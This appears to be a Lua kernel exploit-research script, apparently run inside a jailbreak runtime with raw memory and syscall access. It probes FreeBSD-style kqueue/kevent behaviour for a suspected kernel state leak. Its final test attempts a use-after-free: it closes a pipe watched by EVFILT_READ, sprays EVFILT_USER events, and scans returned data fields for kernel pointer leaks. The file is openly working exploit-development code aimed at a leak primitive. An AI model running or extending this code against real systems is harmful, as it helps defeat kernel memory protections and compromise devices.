--[[
    data_equals_16_investigation.lua
    Investigate data=16 = KN_DETACHED (0x10)
    This is a potential kernel STATE leak!
]]

local mem = rawget(_G, "memory")
local S = rawget(_G, "syscall")

S.resolve({kqueue = 362, kevent = 363, close = 6})

local function tonn(v)
    if v == nil then return 0 end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(tostring(v or 0)) or 0
end

local function kevent(...)
    return tonn(S.kevent(...))
end

local function mkuev_raw(ident, flags, fflags, data_val, udata_val)
    local ev = mem.alloc(32)
    mem.write_qword(ev + 0, ident)
    mem.write_word(ev + 8, 0xFFF9)
    mem.write_word(ev + 10, flags)
    mem.write_dword(ev + 12, fflags)
    mem.write_qword(ev + 16, data_val or 0)
    mem.write_qword(ev + 24, udata_val or 0)
    return ev
end

print("[+] KN_DETACHED (data=16) Investigation\n")

-- Test A: Does EV_CLEAR cause data=16?
print("[*] Test A: EV_CLEAR vs no EV_CLEAR\n")

-- Without EV_CLEAR
local kq_a1 = tonn(S.kqueue())
local ev_a1 = mkuev_raw(0xA01, 0x5, 0x80000000, 0, 0)  -- EV_ADD|EV_ENABLE only
kevent(kq_a1, ev_a1, 1, nil, 0, 0)
local out_a1 = mem.alloc(32)
local n_a1 = kevent(kq_a1, nil, 0, out_a1, 1, 0)
if n_a1 and n_a1 > 0 then
    local d = tonn(mem.read_qword(out_a1 + 16))
    print(string.format("  Without EV_CLEAR: data=%d", d))
end
kevent(kq_a1, nil, 0, nil, 0, 0)

-- With EV_CLEAR
local kq_a2 = tonn(S.kqueue())
local ev_a2 = mkuev_raw(0xA02, 0x25, 0x80000000, 0, 0)  -- EV_ADD|EV_ENABLE|EV_CLEAR
kevent(kq_a2, ev_a2, 1, nil, 0, 0)
local out_a2 = mem.alloc(32)
local n_a2 = kevent(kq_a2, nil, 0, out_a2, 1, 0)
if n_a2 and n_a2 > 0 then
    local d = tonn(mem.read_qword(out_a2 + 16))
    print(string.format("  With EV_CLEAR: data=%d", d))
end
kevent(kq_a2, nil, 0, nil, 0, 0)

-- Test B: Does the kevent() call between add and read change data?
print("\n[*] Test B: Intermediate kevent() effect on data\n")

local kq_b = tonn(S.kqueue())

-- Register 5 EVFILT_USER WITHOUT trigger
for i = 1, 5 do
    local ev = mkuev_raw(0xB00 + i, 0x25, 0, 0, 0)  -- no trigger
    kevent(kq_b, ev, 1, nil, 0, 0)
end

-- Call an INTERMEDIATE empty kevent (no events to read)
local dummy = mem.alloc(32)
local r_dummy = kevent(kq_b, nil, 0, dummy, 1, 1)  -- with timeout=1
print(string.format("  Intermediate read: %s events", tostring(r_dummy)))

-- Now read properly
local out_b = mem.alloc(32 * 10)
local n_b = kevent(kq_b, nil, 0, out_b, 10, 0)
print(string.format("  After intermediate: %d events", n_b or 0))
if n_b and n_b > 0 then
    for i = 0, n_b - 1 do
        local ident = tonn(mem.read_qword(out_b + i * 32))
        local data = tonn(mem.read_qword(out_b + i * 32 + 16))
        print(string.format("    [%d] ident=0x%x data=%d", i, ident, data))
    end
end
kevent(kq_b, nil, 0, nil, 0, 0)

-- Test C: Trigger pattern and data correlation
print("\n[*] Test C: Can we trigger data=16 consistently?\n")

local function test_pattern(trigger_on_add, separate_read, use_ev_clear, label)
    local kq = tonn(S.kqueue())
    for i = 1, 3 do
        local f = trigger_on_add and 0x80000000 or 0
        local fl = use_ev_clear and 0x25 or 0x5
        local ev = mkuev_raw(0xC00 + i, fl, f, 0, 0)
        kevent(kq, ev, 1, nil, 0, 0)
    end
    
    if separate_read then
        local out = mem.alloc(32 * 5)
        local n = kevent(kq, nil, 0, out, 5, 0)
        print(string.format("  %s: %s events", label, tostring(n)))
        if n and n > 0 then
            for i = 0, n - 1 do
                local d = tonn(mem.read_qword(out + i * 32 + 16))
                print(string.format("    data[%d]=%d", i, d))
            end
        end
    end
    kevent(kq, nil, 0, nil, 0, 0)
end

test_pattern(true, true, true, "trigger+read+EV_CLEAR")
test_pattern(true, true, false, "trigger+read+no CLEAR")
test_pattern(false, true, true, "no trigger+read+EV_CLEAR")
test_pattern(true, false, true, "trigger+no read+EV_CLEAR")

-- Test D: Does the system-wide count affect data?
print("\n[*] Test D: Data vs total allocated objects\n")

-- Create many kqueues to use system resources
for kk = 1, 5 do
    local kq_d = tonn(S.kqueue())
    -- Add many pipes to exhaust pipe resources
    for pp = 1, 20 do
        local pbuf = mem.alloc(16)
        S.pipe(pbuf)
    end
    -- Register EVFILT_USER and check data pattern
    for ii = 1, 3 do
        local ev = mkuev_raw(0xD00 + ii, 0x25, 0x80000000, 0, 0)
        kevent(kq_d, ev, 1, nil, 0, 0)
    end
    local out_d = mem.alloc(32 * 5)
    local n_d = kevent(kq_d, nil, 0, out_d, 5, 0)
    if n_d and n_d > 0 then
        local d0 = tonn(mem.read_qword(out_d + 16))
        print(string.format("  kqueue batch %d: data=%d (first event)", kk, d0))
    end
    kevent(kq_d, nil, 0, nil, 0, 0)
end

-- Test E: Can we read raw knote memory via EVFILT_USER spray + UAF?
print("\n[*] Test E: UAF + EVFILT_USER + data field as leak primitive\n")

for round = 1, 5 do
    local kq_e = tonn(S.kqueue())
    local pbuf_e = mem.alloc(16)
    S.pipe(pbuf_e)
    local rd_e = tonn(mem.read_dword(pbuf_e))
    local wr_e = tonn(mem.read_dword(pbuf_e + 4))
    
    -- EVFILT_READ on pipe
    local ev_r = mkuev_raw(rd_e, 0x5, 0, 0, 0)
    mem.write_word(ev_r + 8, 0xFFFF)  -- EVFILT_READ (change filter)
    kevent(kq_e, ev_r, 1, nil, 0, 0)
    
    -- Spray some EVFILT_USER (for safety)
    for i = 1, 50 do
        local ev_u = mkuev_raw(i, 0x25, 0x80000000, 0, 0)
        kevent(kq_e, ev_u, 1, nil, 0, 0)
    end
    
    -- Close pipe (UAF)
    S.close(rd_e)
    S.close(wr_e)
    
    -- More EVFILT_USER spray
    for i = 51, 100 do
        local ev_u = mkuev_raw(i, 0x25, 0x80000000, 0, 0)
        kevent(kq_e, ev_u, 1, nil, 0, 0)
    end
    
    -- Read events and check data field
    local out_e = mem.alloc(32 * 150)
    local n_e = kevent(kq_e, nil, 0, out_e, 150, 0)
    if n_e and n_e > 0 then
        local unusual = false
        for i = 0, n_e - 1 do
            local data = tonn(mem.read_qword(out_e + i * 32 + 16))
            if data > 100 then  -- unusual value
                if not unusual then
                    print(string.format("  KPTR-LEAK Round %d:", round))
                    unusual = true
                end
                local ident = tonn(mem.read_qword(out_e + i * 32))
                print(string.format("    [%d] ident=%d data=%d", i, ident, data))
            end
        end
        if not unusual then
            print(string.format("  Round %d: %d events, all data sane", round, n_e))
        end
    else
        print(string.format("  Round %d: no events", round))
    end
    kevent(kq_e, nil, 0, nil, 0, 0)
end

print("\n[+] Done")
